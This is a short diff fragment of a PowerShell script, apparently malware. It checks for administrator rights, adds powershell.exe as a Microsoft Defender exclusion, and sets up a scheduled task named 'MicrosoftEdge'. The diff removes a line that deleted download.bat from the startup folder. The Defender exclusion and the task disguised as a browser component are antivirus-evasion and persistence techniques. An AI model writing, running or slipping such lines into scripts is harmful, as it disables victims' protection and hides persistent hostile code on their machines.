@@ -49,7 +49,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 
-Remove-Item -Path "$startupfolder\download.bat" -Force
 Add-MpPreference -ExclusionProcess "powershell.exe"
 
 $task_name = "MicrosoftEdge"
